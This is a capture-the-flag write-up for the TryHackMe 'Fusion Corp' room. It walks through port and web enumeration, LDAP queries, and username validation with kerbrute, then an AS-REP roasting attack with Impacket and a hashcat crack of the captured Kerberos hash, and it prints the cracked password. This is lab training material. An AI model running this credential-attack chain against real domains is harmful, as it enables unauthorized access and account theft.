### Fusion Crop

![image](https://user-images.githubusercontent.com/5285547/122137683-1f656e00-ce3d-11eb-9e38-8ad66e83b6ee.png)

[Room Link](https://tryhackme.com/room/fusioncorp)  
Created by: [MrSeth6797](https://tryhackme.com/p/MrSeth6797)

## Enumeration

### Nmap

```bash
nmap -p- 10.10.222.16 
```
```bash
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49669/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49691/tcp open  unknown
49698/tcp open  unknown
```

### Gobuster

```bash
gobuster dir -u "http://10.10.222.16/"  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,html,gz,php,js,zip,img,bak,opvn
```
```bash
/index.html           (Status: 200) [Size: 53888]
/blog.html            (Status: 200) [Size: 22163]
/img                  (Status: 301) [Size: 147] [--> http://10.10.222.16/img/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.222.16/css/]
/Index.html           (Status: 200) [Size: 53888]                             
/lib                  (Status: 301) [Size: 147] [--> http://10.10.222.16/lib/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.222.16/js/] 
/Blog.html            (Status: 200) [Size: 22163]                             
/backup               (Status: 301) [Size: 150] [--> http://10.10.222.16/backup/]
```

## User 1

In /backups we find a list of employees 

![image](https://user-images.githubusercontent.com/5285547/122767322-72ef1600-d29a-11eb-9539-d73b287f58f3.png)

![image](https://user-images.githubusercontent.com/5285547/122768231-4f789b00-d29b-11eb-9fdd-6bbc9119999b.png)

Extracting the names using regex I put the usernames into a new file called users.txt, so I can use windows tools to start to enumerate for any valid users. 

## Domain name

This can be seen in nmap output or via a quick ldapsearch

### ldapserach

```bash
ldapsearch -x -h 10.10.222.16 -s base namingcontexts
```
```bash
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=fusion,DC=corp
namingcontexts: CN=Configuration,DC=fusion,DC=corp
namingcontexts: CN=Schema,CN=Configuration,DC=fusion,DC=corp
namingcontexts: DC=DomainDnsZones,DC=fusion,DC=corp
namingcontexts: DC=ForestDnsZones,DC=fusion,DC=corp

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
``

Add fusion.corp to /etc/hosts

```bash
sudo nano /etc/hosts
```

### Finding a valid user

[Kerbrute Tool](https://github.com/ropnop/kerbrute)

Install
```
go get github.com/ropnop/kerbrute
```

```bash
./kerbrute userenum -d 'fusion.corp' --dc 10.10.33.48 ~/users.txt
```

![image](https://user-images.githubusercontent.com/5285547/122769576-91eea780-d29c-11eb-9a3a-8066ab594014.png)


## User 1

```
lparker@fusion.corp
```

Making a new users.txt file with just "lparker" our valid user name, I use a tool "GetNPUsers.py" to do a asreproast attack. 

```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 'fusion.corp/' -usersfile ~/users.txt -no-pass -dc-ip 10.10.222.16 -format hashcat -outputfile hashes.asreproast
```

We get the hash

```cat hashes.asreproast```                                                  

```
$krb5asrep$23$lparker@FUSION.CORP:86658453c7705714369e31d6bd1cd144$728e7c5e2ae3648d5b0b3056b3f76c611141091a620dd460ff30bc8c1dd140c156f671ce414e23c52b1101fa834989668947194ec5bcfb8131acd2ec4fadedb535b6d8695e3bc941a8256537840c167890adb420516882f74af905fce6ada1a7623d8ca7b916c7536edefb2f95c54fea38671d860aad2dd7b307d828a891aed3b9ebba49a24694fb15a61bcf1231a135283eeb754540d6083384a486c7b3e0b541dfc00cbf26d6d460525a52261d83c1a25c3e1bd5577010b987ca026937d0467886f9fe3eb91a790fcf0b6120d7a93d021851c4d4217d63bb9e0c0dc4401e1139d3dff01ada7d3871cd
```

## Crack the hash! 

```
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -O 
```

```
$krb5asrep$23$lparker@FUSION.CORP:86658453c7705714369e31d6bd1cd144$728e7c5e2ae3648d5b0b3056b3f76c611141091a620dd460ff30bc8c1dd140c156f671ce414e23c52b1101fa834989668947194ec5bcfb8131acd2ec4fadedb535b6d8695e3bc941a8256537840c167890adb420516882f74af905fce6ada1a7623d8ca7b916c7536edefb2f95c54fea38671d860aad2dd7b307d828a891aed3b9ebba49a24694fb15a61bcf1231a135283eeb754540d6083384a486c7b3e0b541dfc00cbf26d6d460525a52261d83c1a25c3e1bd5577010b987ca026937d0467886f9fe3eb91a790fcf0b6120d7a93d021851c4d4217d63bb9e0c0dc4401e1139d3dff01ada7d3871cd:!!abbylvzsvs2k6!
```
